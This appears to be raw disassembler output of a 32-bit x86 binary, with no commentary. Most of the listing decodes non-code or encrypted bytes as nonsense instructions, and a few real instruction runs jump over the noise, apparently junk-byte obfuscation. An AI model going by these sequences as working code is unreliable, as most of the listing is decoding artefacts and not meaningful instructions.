  40aafa:	push   es
  40aafb:	push   edi
  40aafc:	push   ecx
  40aafd:	sub    ah,BYTE PTR [ecx+0x3]
  40ab00:	inc    edx
  40ab01:	nop
  40ab02:	inc    eax
  40ab03:	sar    BYTE PTR [ecx+eiz*1],0x41
  40ab07:	or     DWORD PTR [ebx],esp
  40ab09:	cmp    BYTE PTR [edx+0x72],cl
  40ab0c:	clc    
  40ab0d:	call   ebx
  40ab0f:	arpl   ax,si
  40ab11:	rol    edi,0x13
  40ab14:	mov    al,ds:0xe32119e2
  40ab19:	pop    ebx
  40ab1a:	push   ecx
  40ab1b:	arpl   bx,ax
  40ab1d:	push   es
  40ab1e:	mov    dl,0xf9
  40ab20:	cli    
  40ab21:	mov    eax,0x6788d0e9
  40ab26:	int3   
  40ab27:	(bad)  
  40ab28:	lea    esp,[eax+0x1bd452ca]
  40ab2e:	jge    0x40ab1b
  40ab30:	mov    ebp,0xd4a5ab73
  40ab35:	sbb    bh,BYTE PTR [eax-0x1a]
  40ab38:	xor    BYTE PTR [edi+0x24],ah
  40ab3b:	(bad)  
  40ab3c:	fcom   QWORD PTR [ecx]
  40ab3e:	outs   dx,DWORD PTR ds:[esi]
  40ab3f:	inc    ecx
  40ab40:	popa   
  40ab41:	inc    esi
  40ab42:	out    0x96,al
  40ab44:	xchg   edx,eax
  40ab45:	(bad)  
  40ab46:	lods   eax,DWORD PTR ds:[esi]
  40ab47:	cli    
  40ab48:	add    al,0x1c
  40ab4a:	mov    ch,0xd5
  40ab4c:	or     esp,ebx
  40ab4e:	mov    ch,0x3b
  40ab50:	iret   
  40ab51:	adc    BYTE PTR [eax-0x68947189],ch
  40ab57:	or     cl,BYTE PTR [eax-0x15]
  40ab5a:	xchg   ebx,eax
  40ab5b:	out    dx,al
  40ab5c:	imul   esp,DWORD PTR [esi],0x34455aaf
  40ab62:	jg     0x40abaa
  40ab64:	lds    ecx,FWORD PTR [ecx]
  40ab66:	jb     0x40abe6
  40ab68:	popf   
  40ab69:	xchg   esp,eax
  40ab6a:	fs mov bh,0x56
  40ab6d:	std    
  40ab6e:	fucomip st,st(4)
  40ab70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab71:	sub    bl,BYTE PTR [edi-0x59]
  40ab74:	das    
  40ab75:	jo     0x40abae
  40ab77:	sti    
  40ab78:	or     eax,0xc0bcc6b5
  40ab7d:	fistp  DWORD PTR [edi+0x19]
  40ab80:	mov    dh,BYTE PTR [ebx]
  40ab82:	xchg   esi,eax
  40ab83:	pop    edx
  40ab84:	push   ebx
  40ab85:	push   edx
  40ab86:	and    BYTE PTR [esi],bh
  40ab88:	xor    BYTE PTR [eax],bl
  40ab8a:	mov    ebp,0x22f199ec
  40ab8f:	cli    
  40ab90:	push   0x4370d609
  40ab95:	rcl    BYTE PTR [esi-0x1064dd88],1
  40ab9b:	imul   eax,DWORD PTR [edx+ebx*2+0x59],0xa77364c3
  40aba3:	adc    dh,BYTE PTR [edx-0x13]
  40aba6:	shr    DWORD PTR [ecx+esi*4],cl
  40aba9:	mov    ds:0xd6f1736d,eax
  40abae:	sbb    al,0x73
  40abb0:	xor    esp,esp
  40abb2:	out    dx,eax
  40abb3:	xchg   esp,eax
  40abb4:	pop    ecx
  40abb5:	mov    eax,0x3ce662e0
  40abba:	mov    ?,WORD PTR [ecx-0x2b0dbb03]
  40abc0:	out    dx,al
  40abc1:	push   edx
  40abc2:	lds    edx,FWORD PTR [esi-0xf]
  40abc5:	mov    WORD PTR [ecx+0x38],es
  40abc8:	gs inc esp
  40abca:	mov    al,ds:0x43a9521d
  40abcf:	idiv   DWORD PTR [eax+edi*1]
  40abd2:	mov    fs,WORD PTR [edx-0x6a31c519]
  40abd8:	pushf  
  40abd9:	cwde   
  40abda:	fwait
  40abdb:	hlt    
  40abdc:	add    DWORD PTR [eax],eax
  40abde:	(bad)  
  40abdf:	mov    ds:0xb156793c,eax
  40abe4:	add    BYTE PTR [ebx-0x2b03033c],cl
  40abea:	add    edx,DWORD PTR [eax+0x21]
  40abed:	or     al,0x4c
  40abef:	inc    edi
  40abf0:	push   esi
  40abf1:	loope  0x40ac01
  40abf3:	mov    cl,0x20
  40abf5:	mov    bl,BYTE PTR [ebx-0x466dab64]
  40abfb:	xchg   esp,eax
  40abfc:	lock mov ebp,0x29c7aa19
  40ac02:	lods   eax,DWORD PTR ds:[esi]
  40ac03:	mov    ds:0x2b82f9b,eax
  40ac08:	test   eax,0xb83cb54
  40ac0d:	mov    dh,0xa7
  40ac0f:	add    edx,DWORD PTR [ebx+0x5fa59533]
  40ac15:	inc    ecx
  40ac16:	cwde   
  40ac17:	adc    edx,DWORD PTR [ecx]
  40ac19:	mov    ah,BYTE PTR [ebx+0x29]
  40ac1c:	into   
  40ac1d:	outs   dx,DWORD PTR ds:[esi]
  40ac1e:	gs pop esp
  40ac20:	(bad)  
  40ac21:	mov    edx,0x425660c1
  40ac26:	adc    eax,0x925a0d16
  40ac2b:	jmp    0x1e20d2d0
  40ac30:	nop
  40ac31:	xchg   bl,dl
  40ac33:	inc    edi
  40ac34:	cwde   
  40ac35:	sbb    dh,cl
  40ac37:	pop    ecx
  40ac38:	es pop edi
  40ac3a:	(bad)  
  40ac3b:	lods   al,BYTE PTR ds:[esi]
  40ac3c:	xchg   DWORD PTR [eax-0x159ba3b0],ebx
  40ac42:	out    dx,al
  40ac43:	add    edi,ecx
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x736a3c5e
  40ac5f:	and    DWORD PTR [ebp+ebp*1+0x3d],0xfffffffc
  40ac64:	jl     0x40ace2
  40ac66:	retf   0x7c79
  40ac69:	jl     0x40ac0e
  40ac6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac6c:	in     al,0x5f
  40ac6e:	jbe    0x40ac67
  40ac70:	lea    ecx,[edi]
  40ac72:	adc    al,al
  40ac74:	daa    
  40ac75:	xor    al,0x65
  40ac77:	mov    cl,0xc6
  40ac79:	test   eax,0xdd44006d
  40ac7e:	cmp    DWORD PTR [eax-0x2e],0x7f
  40ac82:	dec    esp
  40ac83:	pop    esp
  40ac84:	mov    esi,0x74d47087
  40ac89:	dec    ecx
  40ac8a:	lock ins DWORD PTR es:[di],dx
  40ac8d:	rcr    BYTE PTR [ebx*2+0x6ed6e35e],1
  40ac94:	inc    edx
  40ac95:	mov    ebx,0x97368034
  40ac9a:	les    eax,FWORD PTR [eax+0x68e08841]
  40aca0:	xor    dh,ch
  40aca2:	xor    ah,BYTE PTR [edx-0x6ba44750]
  40aca8:	dec    ecx
  40aca9:	and    al,0xdf
  40acab:	xchg   esi,eax
  40acac:	mov    ds:0xf181c3a1,al
  40acb1:	mov    edx,0xbbd3934e
  40acb6:	sub    ebx,DWORD PTR [ebx]
  40acb8:	mov    eax,ds:0x139936ca
  40acbd:	shl    BYTE PTR [ebx],1
  40acbf:	push   eax
  40acc0:	xchg   DWORD PTR [esp-0x1fb0134e],edi
  40acc7:	mov    ecx,0xc5063f53
  40accc:	mov    dh,ah
  40acce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40accf:	mov    ch,0x5
  40acd1:	mov    esi,0x338c9c9c
  40acd6:	push   ecx
  40acd7:	scas   al,BYTE PTR es:[edi]
  40acd8:	push   cs
  40acd9:	ret    0x6897
  40acdc:	jmp    0x40ad3c
  40acde:	test   eax,0xf1f3683e
  40ace3:	pop    esi
  40ace4:	jmp    0x40ad15
  40ace6:	fild   WORD PTR [ebx+esi*2-0x79]
  40acea:	add    DWORD PTR [ebp-0x4a207a6d],edi
  40acf0:	dec    esi
  40acf1:	out    0xdb,eax
  40acf3:	dec    ebx
  40acf4:	out    dx,al
  40acf5:	add    ecx,eax
  40acf7:	fwait
  40acf8:	jmp    0x468abd78
  40acfd:	std    
  40acfe:	jp     0x40aceb
  40ad00:	inc    edx
  40ad01:	es jb  0x40ad6b
  40ad04:	inc    edi
  40ad05:	adc    ebp,DWORD PTR [edi+0x6f9f6765]
  40ad0b:	mov    ah,0xeb
  40ad0d:	leave  
  40ad0e:	scas   eax,DWORD PTR es:[edi]
  40ad0f:	and    al,0x7a
  40ad11:	pop    ebx
  40ad12:	mov    esi,0x470c89bc
  40ad17:	push   ss
  40ad18:	ret    0xc687
  40ad1b:	mov    bh,0xaf
  40ad1d:	mov    al,ds:0xb89bad3b
  40ad22:	js     0x40acf6
  40ad24:	aad    0x3a
  40ad26:	push   0x1a
  40ad28:	mov    eax,ds:0x4638c96c
  40ad2d:	xchg   esp,eax
  40ad2e:	lock mov eax,0xe85ad199
  40ad34:	pop    ecx
  40ad35:	loopne 0x40ad3e
  40ad37:	iret   
  40ad38:	outs   dx,BYTE PTR ds:[esi]
  40ad39:	into   
  40ad3a:	je     0x40ad5f
  40ad3c:	stos   DWORD PTR es:[edi],eax
  40ad3d:	cli    
  40ad3e:	(bad)  
  40ad3f:	jmp    0x4c512a25
  40ad44:	into   
  40ad45:	ins    BYTE PTR es:[edi],dx
  40ad46:	mov    ch,0x8
  40ad48:	int    0x34
  40ad4a:	(bad)  
  40ad4b:	imul   BYTE PTR [edx+0x74]
  40ad4e:	lahf   
  40ad4f:	mov    al,0x80
  40ad51:	xchg   edi,eax
  40ad52:	test   eax,0x45e8acca
  40ad57:	dec    ebx
  40ad58:	add    al,0xe4
  40ad5a:	adc    bl,BYTE PTR [edx+0x5ab35437]
  40ad60:	leave  
  40ad61:	(bad)  
  40ad62:	cs in  eax,0x5
  40ad65:	xchg   bl,al
  40ad67:	jge    0x40ad79
  40ad69:	iret   
  40ad6a:	fimul  DWORD PTR [ebp-0x70]
  40ad6d:	mov    ds:0xd8450b4a,al
  40ad72:	fild   WORD PTR fs:[edx-0x3e5ac1f0]
  40ad79:	enter  0x3b17,0x68
  40ad7d:	lahf   
  40ad7e:	out    0x21,al
  40ad80:	imul   edx,DWORD PTR [ebp-0x6c228a96],0x460762dc
  40ad8a:	loope  0x40adf2
  40ad8c:	sbb    eax,0x96dc530b
  40ad91:	arpl   WORD PTR [ebp-0x20],si
  40ad94:	fcomp  st(7)
  40ad96:	push   ecx
  40ad97:	pop    ds
  40ad98:	ret    
  40ad99:	push   0x4d16e8f5
  40ad9e:	mov    ebx,0x54f05280
  40ada3:	lahf   
  40ada4:	loope  0x40ad4c
  40ada6:	mov    al,0x16
  40ada8:	lods   eax,DWORD PTR ds:[esi]
  40ada9:	fld    DWORD PTR [edi-0x10]
  40adac:	mov    edi,0x9b741335
  40adb1:	repnz sub edi,DWORD PTR [ebp+0x1796400a]
  40adb8:	push   esi
  40adb9:	repnz dec ebp
  40adbb:	pusha  
  40adbc:	inc    ecx
  40adbd:	into   
  40adbe:	and    BYTE PTR ds:0x388439cf,cl
  40adc4:	and    eax,0x4f1a7ff3
  40adc9:	mov    edx,0x766b3704
  40adce:	dec    esi
  40adcf:	inc    edi
  40add0:	push   cs
  40add1:	dec    eax
  40add2:	mov    eax,ds:0xa115ee23
  40add7:	iret   
  40add8:	aas    
  40add9:	mov    ebx,0xa12982e9
  40adde:	popa   
  40addf:	mov    cl,bh
  40ade1:	cmp    BYTE PTR [edi],ch
  40ade3:	pusha  
  40ade4:	mov    dl,bl
  40ade6:	test   ch,dl
  40ade8:	icebp  
  40ade9:	jno    0x40ad7f
  40adeb:	add    BYTE PTR [edi+ebx*4-0x6721435e],bh
  40adf2:	mov    cl,0x43
  40adf4:	fnstcw WORD PTR [eax]
  40adf6:	sub    eax,DWORD PTR [ebx]
  40adf8:	imul   ebx,DWORD PTR ss:[ecx-0x4b],0xd3a43f69
  40ae00:	inc    ecx
  40ae01:	cmp    al,0x6d
  40ae03:	mov    al,ds:0xb5538b9d
  40ae08:	pushf  
  40ae09:	pop    ds
  40ae0a:	ins    BYTE PTR es:[edi],dx
  40ae0b:	inc    ebp
  40ae0c:	sub    ch,dl
  40ae0e:	(bad)  
  40ae10:	dec    ebp
  40ae11:	call   0xdb60:0x3f735656
  40ae18:	lahf   
  40ae19:	aam    0x2d
  40ae1b:	jl     0x40ae0b
  40ae1d:	or     DWORD PTR [eax-0x2e34c8ad],esi
  40ae23:	mov    dl,0x45
  40ae25:	add    BYTE PTR [ebx+edx*8-0x6a737c2b],dh
  40ae2c:	pop    eax
  40ae2d:	pop    ebx
  40ae2e:	in     al,0xaa
  40ae30:	call   0xbd2a4ed2
  40ae35:	cmp    BYTE PTR [edi+0x3],bl
  40ae38:	xchg   esi,eax
  40ae39:	sub    ebp,ebp
  40ae3b:	xor    ah,BYTE PTR [edx]
  40ae3d:	sahf   
  40ae3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae3f:	xchg   ebx,eax
  40ae40:	repnz xor eax,0x44030cc7
  40ae46:	test   al,0x29
  40ae48:	cs lahf 
  40ae4a:	rcr    BYTE PTR [ebp-0xde8b25c],0xfb
  40ae51:	push   ss
  40ae52:	or     ebx,0xfffffff2
  40ae55:	hlt    
  40ae56:	jo     0x40ae29
  40ae58:	cmp    DWORD PTR [edi],edx
  40ae5a:	jl     0x40aebd
  40ae5c:	cwde   
  40ae5d:	or     bh,BYTE PTR [edx+0x72daf3eb]
  40ae63:	cmp    bl,bl
  40ae65:	pavgb  mm2,QWORD PTR [esi+0x23]
  40ae69:	rcl    esp,cl
  40ae6b:	cs jbe 0x40ae20
  40ae6e:	sub    eax,DWORD PTR [edx+ebx*2-0x66]
  40ae72:	cmp    al,0x64
  40ae74:	sbb    ebx,eax
  40ae76:	inc    esp
  40ae77:	ins    DWORD PTR es:[edi],dx
  40ae78:	sbb    al,0x7e
  40ae7a:	adc    dl,BYTE PTR [edi-0x73]
  40ae7d:	(bad)  
  40ae7e:	cmp    DWORD PTR [esp+edx*1+0x27dc6bc6],esi
  40ae85:	imul   esp,DWORD PTR [edi],0x5f66cc8f
  40ae8b:	mov    ebx,0x3c5cc7c6
  40ae90:	dec    ebx
  40ae91:	es cs pop esi
  40ae94:	test   BYTE PTR [edx+eax*8+0x20477b90],ah
  40ae9b:	push   edi
  40ae9c:	jae    0x40aecd
  40ae9e:	and    BYTE PTR [ebx],0x95
  40aea1:	aas    
  40aea2:	imul   DWORD PTR [edx-0x19]
  40aea5:	call   0x6399e45e
  40aeaa:	out    0xcd,eax
  40aeac:	mov    ss,ebx
  40aeae:	jmp    0x6008:0xb5e58d45
  40aeb5:	ss sub al,0x6f
  40aeb8:	ret    
  40aeb9:	xor    BYTE PTR [esi],bh
  40aebb:	scas   eax,DWORD PTR es:[edi]
  40aebc:	gs scas al,BYTE PTR es:[edi]
  40aebe:	xchg   ebx,eax
  40aebf:	ins    DWORD PTR es:[edi],dx
  40aec0:	mov    BYTE PTR ds:0x27a2c3a4,dl
  40aec6:	addr16 pop eax
  40aec8:	punpckhbw mm7,QWORD PTR [eax+esi*4]
  40aecc:	push   0xd4164d7c
  40aed1:	lahf   
  40aed2:	rcl    ebx,cl
  40aed4:	call   0x31ac:0xb5261b40
  40aedb:	cmp    eax,0xe113582c
  40aee0:	dec    edi
  40aee1:	push   ecx
  40aee2:	test   BYTE PTR [ebx-0x5eeac5f2],ah
  40aee8:	inc    ebx
  40aee9:	mov    ebx,0x86b0e3ac
  40aeee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef0:	pop    es
  40aef1:	jne    0x40af4a
  40aef3:	call   0x77b53da1
  40aef8:	(bad)  
  40aefa:	minps  xmm0,XMMWORD PTR [eax+0x58]
  40aefe:	ds mov ch,0x1
  40af01:	push   ecx
  40af02:	lods   al,BYTE PTR ds:[esi]
  40af03:	das    
  40af04:	js     0x40af07
  40af06:	lahf   
  40af07:	add    eax,0x46026209
  40af0c:	cmp    al,0xda
  40af0e:	xchg   ebp,eax
  40af0f:	sar    DWORD PTR [edi],cl
  40af11:	sub    al,0x52
  40af13:	add    eax,DWORD PTR [eax-0x58]
  40af16:	pop    esi
  40af17:	adc    al,0x20
  40af19:	mov    cl,0x5b
  40af1b:	mov    DWORD PTR [edx],esi
  40af1d:	and    DWORD PTR [eax],edi
  40af1f:	add    cl,BYTE PTR [ebx+0x41]
  40af22:	push   ebx
  40af23:	ds stos BYTE PTR es:[edi],al
  40af25:	dec    eax
  40af26:	sub    ebp,DWORD PTR [edx+0x29]
  40af29:	cmp    bl,BYTE PTR [esi-0x59]
  40af2c:	push   ds
  40af2d:	inc    esi
  40af2e:	fadd   QWORD PTR [esi]
  40af30:	add    al,0x11
  40af32:	str    WORD PTR [ecx-0x73]
  40af36:	jp     0x40af03
  40af38:	sub    BYTE PTR [ecx],ah
  40af3a:	call   0xe163b361
  40af3f:	sub    eax,0xa608b513
  40af44:	sti    
  40af45:	outs   dx,DWORD PTR ds:[esi]
  40af46:	test   DWORD PTR [edi-0x23],0x96307c69
  40af4d:	lahf   
  40af4e:	add    esp,DWORD PTR [ebx]
  40af50:	popf   
  40af51:	mov    ah,0xc9
  40af53:	dec    ebp
  40af54:	push   ebp
  40af55:	pop    edi
  40af56:	cli    
  40af57:	repnz mov al,BYTE PTR [edi]
  40af5a:	ret    0x16f9
  40af5d:	cmp    dl,BYTE PTR [ebx+0x7d]
  40af60:	loop   0x40af4b
  40af62:	test   al,0x2e
  40af64:	mov    edx,0xab5b522
  40af69:	push   cs
  40af6a:	les    ebx,FWORD PTR [edi-0x62]
  40af6d:	cmp    eax,0x8a486d95
  40af72:	imul   ecx,DWORD PTR [eax],0xc9d5a89c
  40af78:	in     eax,0xe
  40af7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af7b:	or     al,0xf7
  40af7d:	xor    esp,DWORD PTR [edx+0x3dd9f10]
  40af83:	mov    ebp,0x17b25dc2
  40af88:	sub    DWORD PTR [eax],esi
  40af8a:	fdiv   st(4),st
  40af8c:	add    BYTE PTR [eax+0x74351c58],bl
  40af92:	loope  0x40af70
  40af94:	loop   0x40b00c
  40af96:	xchg   esp,eax
  40af97:	fild   QWORD PTR [edx+esi*8]
  40af9a:	mov    dl,bl
  40af9c:	cmp    eax,0x4602a020
  40afa1:	pop    esp
  40afa2:	mov    cl,0x72
  40afa4:	prefetcht2 BYTE PTR [eax-0x20]
  40afa8:	outs   dx,BYTE PTR ds:[esi]
  40afa9:	sbb    cl,BYTE PTR [bx+0x41]
  40afad:	sbb    BYTE PTR [ecx],0x40
  40afb0:	cmp    BYTE PTR [bp+di],0x1c
  40afb4:	add    BYTE PTR [ecx+0x24e3f7c0],bl
  40afba:	cmp    ebp,DWORD PTR [eax-0x368da108]
  40afc0:	mov    ebx,DWORD PTR [ebp-0x10]
  40afc3:	sub    ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fsub   DWORD PTR [edi-0x7400c01d]
  40b004:	stc    
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40afe5
  40b00c:	loopne 0x40afbc
  40b00e:	mov    eax,0x61992468
  40b013:	add    esp,0xde43b5e1
  40b019:	sub    dh,BYTE PTR [ebx+0x181a9950]
  40b01f:	ja     0x40b056
  40b021:	mov    eax,ds:0x76d77aeb
  40b026:	xchg   ebp,eax
  40b027:	sbb    cl,dl
  40b029:	or     esp,DWORD PTR [edx+ebp*1]
  40b02c:	popf   
  40b02d:	mov    cl,0xec
  40b02f:	pop    ss
  40b030:	cli    
  40b031:	lods   al,BYTE PTR ds:[esi]
  40b032:	ret    
  40b033:	inc    ebp
  40b034:	call   0x3019:0xf902fcd2
  40b03b:	pop    ss
  40b03c:	loopne 0x40aff7
  40b03e:	sub    al,0x94
  40b040:	mov    dh,0x43
  40b042:	retf   
  40b043:	jmp    0x7f23dc57
  40b048:	arpl   WORD PTR [edi+0x3751756b],ax
  40b04e:	jmp    0x5d19:0x9c873ddc
  40b055:	and    DWORD PTR [ecx-0x8ef41cb],0xef17ebf2
  40b05f:	(bad)  
  40b060:	call   0x442cdb3e
  40b065:	loop   0x40b03e
  40b067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b068:	scas   eax,DWORD PTR es:[edi]
  40b069:	test   eax,0x208dc32c
  40b06e:	mov    ecx,0xe2da642e
  40b073:	test   al,0xc2
  40b075:	cld    
  40b076:	jae    0x40b091
  40b078:	dec    esp
  40b079:	out    dx,eax
  40b07a:	or     dl,ch
  40b07c:	dec    esp
  40b07d:	pop    es
  40b07e:	and    esp,ecx
  40b080:	push   ds
  40b081:	xchg   BYTE PTR [eax+0x77],dh
  40b084:	and    eax,0xe2a9b85f
  40b089:	outs   dx,BYTE PTR ds:[esi]
  40b08a:	sbb    eax,0xc66b970b
  40b08f:	cld    
  40b090:	mov    ebp,ecx
  40b092:	adc    BYTE PTR [esi],ah
  40b094:	fld    DWORD PTR [ecx]
  40b096:	sub    esi,DWORD PTR [esi]
  40b098:	mov    cl,0xd3
  40b09a:	mov    ds:0xe0ae870,eax
  40b09f:	xchg   DWORD PTR [ecx],edx
  40b0a1:	out    dx,eax
  40b0a2:	mov    bh,0xf4
  40b0a4:	dec    edx
  40b0a5:	push   es
  40b0a6:	adc    al,0x4d
  40b0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a9:	gs fsubr st,st(2)
  40b0ac:	jbe    0x40b03e
  40b0ae:	in     al,0x1f
  40b0b0:	ins    BYTE PTR es:[edi],dx
  40b0b1:	sar    BYTE PTR [ebp-0x5b7598d0],cl
  40b0b7:	sti    
  40b0b8:	or     eax,0x186a726e
  40b0bd:	add    al,ch
  40b0bf:	sbb    BYTE PTR [eax+esi*8],dl
  40b0c2:	adc    esi,DWORD PTR [ebx-0x6d]
  40b0c5:	je     0x40b0de
  40b0c7:	out    dx,al
  40b0c8:	jmp    0xaf9b06b4
  40b0cd:	sub    bh,cl
  40b0cf:	pop    ecx
  40b0d0:	aad    0x5d
  40b0d2:	adc    BYTE PTR [eax-0x436ae46b],bh
  40b0d8:	repnz scas eax,DWORD PTR es:[edi]
  40b0da:	xor    al,0xd2
  40b0dc:	sbb    DWORD PTR [esi-0x7763d8e7],ebx
  40b0e2:	(bad)  
  40b0e3:	sub    dh,ch
  40b0e5:	rcr    DWORD PTR [eax+0x51b7703d],1
  40b0eb:	mov    bh,0x7
  40b0ed:	jecxz  0x40b161
  40b0ef:	adc    al,0x98
  40b0f1:	cmc    
  40b0f2:	fcom   st(2)
  40b0f4:	push   ecx
  40b0f5:	cmp    BYTE PTR [ecx+ebx*4-0x1268e239],ch
  40b0fc:	mov    ds:0xf141dd43,al
  40b101:	rcl    ebp,0x15
  40b104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b105:	int    0x54
  40b107:	jmp    0x7e5ccbf0
  40b10c:	fwait
  40b10d:	outs   dx,BYTE PTR es:[esi]
  40b10f:	fmul   DWORD PTR ds:0xcf37987a
  40b115:	xchg   edx,eax
  40b116:	mov    eax,DWORD PTR [esi-0x71]
  40b119:	pop    edx
  40b11a:	imul   esp,DWORD PTR [eax-0x44a7ee61],0xec069937
  40b124:	mov    ah,0x4a
  40b126:	sub    al,0x55
  40b128:	(bad)  
  40b129:	mov    ds:0x8702db6a,al
  40b12e:	cmp    BYTE PTR [edi-0x52],ch
  40b131:	push   0x8caed8ac
  40b136:	and    BYTE PTR [edi+ebp*4+0x64],dl
  40b13a:	jns    0x40b135
  40b13c:	bound  ebp,QWORD PTR [edx+0x6569edce]
  40b142:	xchg   ebp,eax
  40b143:	pop    es
  40b144:	test   DWORD PTR [edi+ecx*2],eax
  40b147:	and    eax,0x98c953ec
  40b14c:	mov    ch,0x10
  40b14e:	inc    eax
  40b14f:	mov    dh,0x2e
  40b151:	std    
  40b152:	lods   al,BYTE PTR ds:[esi]
  40b153:	pop    esi
  40b154:	cmp    BYTE PTR [ebx-0x4d],al
  40b157:	rcr    BYTE PTR [edx+0x68bdeac5],cl
  40b15d:	stc    
  40b15e:	adc    BYTE PTR [ebx],0x32
  40b161:	(bad)  
  40b162:	xchg   esi,eax
  40b163:	mov    bl,0xe4
  40b165:	shl    DWORD PTR [ebx],1
  40b167:	jg     0x40b18c
  40b169:	(bad)  [esi-0x3188817d]
  40b16f:	or     BYTE PTR [eax+0x71ed0827],bh
  40b175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b176:	(bad)  
  40b177:	mov    bh,0xf0
  40b179:	lahf   
  40b17a:	add    bh,cl
  40b17c:	mov    edx,0xb5381f97
  40b181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b182:	not    BYTE PTR [edi]
  40b184:	add    eax,0x3241f193
  40b189:	in     eax,dx
  40b18a:	pop    ebp
  40b18b:	and    BYTE PTR [edx+0x2753dc81],bl
  40b191:	xchg   edx,eax
  40b192:	mov    ebp,edx
  40b194:	or     eax,0x6fb6d736
  40b199:	adc    DWORD PTR [ecx+0x741c3f9e],esp
  40b19f:	or     DWORD PTR [edi+0xa],edi
  40b1a2:	cmp    DWORD PTR [ecx-0x8],edi
  40b1a5:	repz lea edi,[eax+0x6198271f]
  40b1ac:	mov    ebx,0xc6145304
  40b1b1:	push   ecx
  40b1b2:	sbb    eax,0xb7de5f01
  40b1b7:	fisubr DWORD PTR [eax]
  40b1b9:	hlt    
  40b1ba:	sbb    bl,BYTE PTR [ebp+0x3d7607c7]
  40b1c0:	mov    esi,0x2d565075
  40b1c5:	mov    bl,0x99
  40b1c7:	jbe    0x40b159
  40b1c9:	out    dx,eax
  40b1ca:	stc    
  40b1cb:	jmp    0x34b2f46d
  40b1d0:	cld    
  40b1d1:	sahf   
  40b1d2:	stc    
  40b1d3:	test   eax,0x2bff0184
  40b1d8:	xchg   BYTE PTR [ebx-0x5062f4c0],dl
  40b1de:	pop    es
  40b1df:	or     eax,0x47502293
  40b1e4:	add    edi,DWORD PTR [ebx+0x2]
  40b1e7:	fst    QWORD PTR [eax+ebp*8+0x53]
  40b1eb:	sub    BYTE PTR [edx+0x13],ch
  40b1ee:	not    esp
  40b1f0:	(bad)  
  40b1f1:	adc    esp,DWORD PTR [edx-0x3d78c06c]
  40b1f7:	mov    WORD PTR [edx+0x7d],es
  40b1fa:	pop    eax
  40b1fb:	js     0x7f6aada0
  40b201:	test   DWORD PTR [ecx+0x267fd19e],0xba510c9d
  40b20b:	pop    edi
  40b20c:	push   ds
  40b20d:	mov    cl,0x49
  40b20f:	dec    eax
  40b210:	arpl   WORD PTR [ecx],bp
  40b212:	mov    WORD PTR [edi+edx*8],es
  40b215:	std    
  40b216:	mov    eax,ds:0xcf1590c1
  40b21b:	ins    DWORD PTR es:[edi],dx
  40b21c:	pop    edi
  40b21d:	jne    0x40b232
  40b21f:	and    ebx,ecx
  40b221:	inc    eax
  40b222:	add    BYTE PTR [ebp-0x2241cd0b],dh
  40b228:	scas   eax,DWORD PTR es:[edi]
  40b229:	ror    DWORD PTR [esi-0x58605515],1
  40b22f:	mov    dl,dl
  40b231:	add    ebx,esi
  40b233:	mov    ebx,ebp
  40b235:	push   esp
  40b236:	jge    0x40b21c
  40b238:	mov    esp,0x1e790600
  40b23d:	clc    
  40b23e:	stos   DWORD PTR es:[edi],eax
  40b23f:	cmp    al,0xaf
  40b241:	ss pushw 0x83a4
  40b246:	mov    al,0xb9
  40b248:	bound  edi,QWORD PTR [esi]
  40b24a:	rcr    BYTE PTR [ecx],1
  40b24c:	adc    al,0x6c
  40b24e:	jne    0x40b244
  40b250:	inc    eax
  40b251:	in     al,0x69
  40b253:	aaa    
  40b254:	icebp  
  40b255:	pop    ecx
  40b256:	inc    esi
  40b257:	pop    ebx
  40b258:	dec    eax
  40b259:	pop    ebp
  40b25a:	sar    DWORD PTR [edx-0x5c],0xb6
  40b25e:	push   edi
  40b25f:	leave  
  40b260:	nop
  40b261:	sahf   
  40b262:	jecxz  0x40b2ce
  40b264:	pop    ds
  40b265:	out    0xe2,al
  40b267:	or     eax,0xc28de340
  40b26c:	cs inc eax
  40b26e:	pop    ds
  40b26f:	mov    eax,0xdf284113
  40b274:	fiadd  DWORD PTR [eax+edx*8+0x7df060e4]
  40b27b:	mov    cl,0xab
  40b27d:	xchg   ecx,eax
  40b27e:	sub    al,0xd2
  40b280:	imul   edx,DWORD PTR [ebp+0x5318da2e],0xd0ea3cc7
  40b28a:	stc    
  40b28b:	fxtract 
  40b28d:	jmp    0x1f85:0x7275854a
  40b294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b295:	inc    ebp
  40b296:	(bad)  
  40b297:	pop    ebx
  40b298:	xor    esp,DWORD PTR [ecx+ebx*1+0x229b7f4f]
  40b29f:	jmp    0x6389:0x9d8d348e
  40b2a6:	fidiv  WORD PTR [edi+0x44]
  40b2a9:	add    dh,BYTE PTR [eax-0x134e45f]
  40b2af:	sbb    BYTE PTR [esi+edx*4],bl
  40b2b2:	inc    edx
